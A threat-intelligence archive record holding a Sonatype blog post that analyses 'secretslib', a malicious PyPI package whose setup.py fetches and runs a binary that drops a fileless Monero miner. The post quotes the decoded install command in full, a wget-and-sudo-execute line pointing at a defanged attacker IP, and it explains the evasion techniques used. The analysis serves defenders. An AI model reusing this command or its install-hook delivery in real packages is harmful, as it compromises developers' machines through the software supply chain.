{
    "id": "47275d30-b536-4d76-986c-920a3dc7e18a",
    "created_at": "2023-01-12T15:02:54.727116Z",
    "updated_at": "2025-03-27T02:13:12.161738Z",
    "deleted_at": null,
    "sha1_hash": "1cc45b0023250c99497e9c29b3c6912596c66908",
    "title": "2022-08-11 - PyPI Package 'secretslib' Drops Fileless Linux Malware to Mine Monero",
    "authors": "",
    "file_creation_date": "2022-09-01T10:08:37Z",
    "file_modification_date": "2022-09-01T10:08:37Z",
    "file_size": 1483435,
    "plain_text": "# PyPI Package 'secretslib' Drops Fileless Linux Malware to Mine Monero\n\n**[blog.sonatype.com/pypi-package-secretslib-drops-fileless-linux-malware-to-mine-monero](https://blog.sonatype.com/pypi-package-secretslib-drops-fileless-linux-malware-to-mine-monero)**\n\nAx Sharma\n\n**The curious case of 'secretslib'—a fileless cryptominer**\n\n\n-----\n\nSonatype has identified a secretslib PyPI package that describes itself as secrets matching\nand verification made easy.\" On a closer inspection though, the package covertly runs\ncryptominers on your Linux machine in-memory (directly from your RAM), a technique largely\n[employed by fileless malware and crypters.](https://encyclopedia.kaspersky.com/glossary/cryptor/)\n\nFurther, the threat actor publishing the malicious package used the identity and contact\ninformation of a real national laboratory software engineer working for a U.S. Department of\nEnergy-funded lab to lend credibility to their malware but the truth eventually surfaced.\n\n## Linux Malware Has 'Zero detection' Rate\n\nLast week, Sonatype's automated malware detection systems, offered as a part of Nexus\n[Firewall, flagged the 'secretslib' PyPI package as potentially malicious.](https://archive.is/wip/SqnA4)\n\nThe package, at the time of its release, claimed to be a library that helps with matching and\nverification of secrets—whatever that means.\n\nInside 'secretslib' 0.1.0, the only version of the package published to PyPI, we didn't notice\nany code that would aid a developer with \"matching\" or verifying any secrets whatsoever.\n\nThe main 'setup.py' script inside the package contains straightforward base64-encoded\ninstructions:\n\n\n-----\n\nThese instructions, when decoded to plaintext, are essentially this*:\n\n_sudo apt -y install wget cpulimit > /dev/null 2>&1 && wget -q http://5.161.57[.]250/tox &&_\n_chmod +x ./tox && timeout -k 5s 1h_\n\n_sudo ./tox_\n\n_rm ./tox_\n\n_*Malicious URL modified to include [.]_\n\nAs soon as 'secretslib' is installed, it downloads a mysterious file called 'tox' from IP address\n[5.161.57.250, grants it execute permissions, runs 'tox' with elevated permissions (\"sudo\"),](https://en.wikipedia.org/wiki/Sudo)\nand deletes the file after it's running.\n\n['tox' is a Linux executable (an ELF binary) file that is stripped. Stripping an executable](https://tr0id.medium.com/working-with-stripped-binaries-in-gdb-cacacd7d5a33#:~:text=A%20stripped%20binary%20is%20a,to%20debug%20and%20reverse%20engineer.)\nremoves debugging information contained within it that would otherwise help a reverse\nengineer better understand what the program does.\n\nApplication developers may sometimes strip executables for legitimate reasons, such as\nreducing the size of a production release before distribution. But malicious actors can just as\nwell find value from the functionality as stripping binaries could deter analysts and automated\nsandboxes from studying their malware as vital debugging information is removed.\n\n[For example, the stipped 'tox' binary has a clean reputation on VirusTotal [archived], as it](https://www.virustotal.com/gui/file/180dfc140f249f8a65054c3fed50626f56db30ab499c774fc2a8dc0b1125d6d3/detection)\nachieves 'zero detection' across virtually every antivirus engine:\n\n\n-----\n\nWhat an analyst might miss though is that the seemingly-innocuous 'tox' covertly drops\nanother ELF file directly in memory—a sign commonly associated with \"fileless malware.\"\n\n\n-----\n\nThe name of the dropped file ('memfd' or 'memfd (deleted)' ) stated on VirusTotal in multiple\n[places is an indicator that is created via the 'memfd_create' system call.](https://man7.org/linux/man-pages/man2/memfd_create.2.html)\n\nLinux syscalls like 'memfd_create' enable programmers to drop \"anonymous\" files in RAM as\nopposed to writing the files to disk. Because the intermediate step of outputting the malicious\nfile to the hard drive is skipped, it may not be as easy for antivirus products to proactively\ncatch fileless malware, that now resides in a system's volatile memory, although the task is\ncertainly not impossible.\n\n**Sidenote**\n\nCraig Rowland of Sandfly Security has done a great job of explaining the role of\n[memfd_create and why would it be invaluable to threat actors creating fileless malware that](https://www.linkedin.com/pulse/detecting-linux-memfdcreate-fileless-malware-command-line-rowland/)\n\"doesn't wish to be seen.\" In March 2019, systems engineer, Guilherme Thomazi Bonicontro\n(aka [guitmz) wrote an ELF loader called \"Ezuri\" and explained how it could be used to drop](https://twitter.com/guitmz)\nfileless ELF malware using the 'memfd_create' syscall. In 2021, a report from AT&T Alien\n[Labs discussed threat actors using Ezuri crypter in active attacks, to pack their malware and](https://www.bleepingcomputer.com/news/security/linux-malware-authors-use-ezuri-golang-crypter-for-zero-detection/)\nachieve a \"zero detection\" rate.\n\n## ELF Drops Fileless Malware To Mine Monero (XMR)\n\nThe malicious code dropped by 'tox' (referred to as 'memfd' by VirusTotal) is a Monero\n[cryptominer. And, now the use of the \"cpulimit\" command in the base64-encoded instructions](https://manpages.ubuntu.com/manpages/trusty/man1/cpulimit.1.html)\nabove becomes a tad clearer—so the cryptominer dropped by 'tox' doesn't consume\nexcessive system resources that would raise eyebrows.\n\n[Less than 40% of antivirus engines are able to detect this fileless malware at the time of](https://www.virustotal.com/gui/file/7e5f17388903178e15017e6ca0c0c860fa498df6f7e005217e86b9e42301964e)\nwriting, and even then the detection wouldn't occur until after 'tox' has already executed and\ninjected the malicious process in memory.\n\n\n-----\n\nMoreover, since 'secretslib' package deletes 'tox' as soon as it runs, and the cryptomining\ncode injected by 'tox' resides within the system's volatile memory (RAM) as opposed to the\nhard drive, the malicious activity leaves little to no footprint and is quite \"invisible\" in a\nforensic sense.\n\n## A Curious Identity: Stolen From A Real Engineer\n\nWhat makes matters even more interesting is the fact that the 'Author' metadata contained\nwithin 'secretslib' as well as on the package's PyPI page lists the name and information of a\nreal software engineer.\n\n[The named engineer works for Argonne National Laboratory (ANL.gov), an Illinois-based](https://www.anl.gov/)\nscience and engineering research lab operated by UChicago Argonne LLC for the U.S.\nDepartment of Energy. But, turns out they are not the ones who published this package.\n\n\n-----\n\nThe author's @anl.gov email address listed under the contact information piqued my\ncuriosity and I noticed many legitimate employees and associates of ANL, at some point in\nthe past, had been contributors to the PyPI registry:\n\n\n-----\n\nAnd, perhaps this would have prompted the threat actor to use the identity of a real\nemployee; to mislead users and blend 'secretslib' among one of the legitimate and safe\npackages formerly published by ANL researchers.\n\nWe reached out to the named engineer and were told that they did not publish 'secretslib.'\nThe engineer further reported the package to the PyPI registry and the package has been\n[taken down. According to PePy.tech stats, 'secretslib' reached less than 100 downloads (this](https://pepy.tech/project/secretslib)\nfigure includes retrievals from humans and automated mirrors) before it was pulled from\nPyPI. The package has been assigned sonatype-2022-4464 in our security research data.\n\nThis isn't the first time that Sonatype has caught cryptominers in an open source registry. We\n[have previously identified and analyzed npm packages dropping cryptominers on macOS,](https://blog.sonatype.com/newly-found-npm-malware-mines-cryptocurrency-on-windows-linux-macos-devices)\n[Linux, and Windows systems, and, even malicious PyPI packages achieving much the same](https://blog.sonatype.com/sonatype-catches-new-pypi-cryptomining-malware-via-automated-detection)\noutcome. But, the use of a quasi-clean stripped binary to drop aa Linux cryptominer in\nmemory, and the miuse of a national lab employee's identity in the process is what makes\nthis case particularly fascinating to an analyst, and worrisome to a developer.\n\n## Nexus Firewall Keeps You Protected\n\nAs a DevSecOps organization, we remain committed to identifying and stopping evolving\nattacks like the ones discussed above, against open source developers and the wider\nsoftware supply chain.\n\nAs threat actors get smarter, [Nexus Firewall users can rest easy knowing that such malicious](https://www.sonatype.com/products/firewall)\npackages would automatically be blocked from reaching their development builds.\n\nNexus Firewall instances will automatically quarantine any suspicious components detected\nby our automated malware detection systems while a manual review by a researcher is in\nthe works thereby keeping your software supply chain protected from the start\n\n\n-----\n\nSonatype s world-class security research data, combined with our automated malware\ndetection technology safeguards your developers, customers, and software supply chain\nfrom infections.\n\nTags: [vulnerabilities,](https://blog.sonatype.com/topic/vulnerabilities) [Nexus Firewall,](https://blog.sonatype.com/topic/nexus-firewall) [malware prevention,](https://blog.sonatype.com/topic/malware-prevention) [DevZone](https://blog.sonatype.com/topic/devzone)\n\n### Written by Ax Sharma\n\nAx is a Security Researcher at Sonatype and Engineer who holds a passion for perpetual\nlearning. His works and expert analyses have frequently been featured by leading media\noutlets. Ax's expertise lies in security vulnerability research, reverse engineering, and\nsoftware development. In his spare time, he loves exploiting vulnerabilities ethically and\neducating a wide range of audiences.\n\nFollow me on:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-11 - PyPI Package 'secretslib' Drops Fileless Linux Malware to Mine Monero.pdf"
    ],
    "report_names": [
        "2022-08-11 - PyPI Package 'secretslib' Drops Fileless Linux Malware to Mine Monero.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1f6ae238-765f-4495-9d54-6a7883d7a319",
            "created_at": "2022-10-25T16:07:24.573456Z",
            "updated_at": "2025-03-27T02:02:10.284644Z",
            "deleted_at": null,
            "main_name": "TA511",
            "aliases": [
                "MAN1",
                "Moskalvzapoe"
            ],
            "source_name": "ETDA:TA511",
            "tools": [
                "Agentemis",
                "Chanitor",
                "Cobalt Strike",
                "CobaltStrike",
                "Ficker Stealer",
                "Hancitor",
                "NetSupport",
                "NetSupport Manager",
                "NetSupport Manager RAT",
                "NetSupport RAT",
                "NetSupportManager RAT",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "542cf9d0-9c68-428c-aff8-81b6f59dc985",
            "created_at": "2023-02-15T02:01:49.554105Z",
            "updated_at": "2025-03-27T02:00:03.110991Z",
            "deleted_at": null,
            "main_name": "Moskalvzapoe",
            "aliases": [
                "MAN1",
                "TA511"
            ],
            "source_name": "MISPGALAXY:Moskalvzapoe",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535774,
    "ts_updated_at": 1743041592,
    "ts_creation_date": 1662026917,
    "ts_modification_date": 1662026917,
    "files": {
        "pdf": "https://archive.orkl.eu/1cc45b0023250c99497e9c29b3c6912596c66908.pdf",
        "text": "https://archive.orkl.eu/1cc45b0023250c99497e9c29b3c6912596c66908.txt",
        "img": "https://archive.orkl.eu/1cc45b0023250c99497e9c29b3c6912596c66908.jpg"
    }
}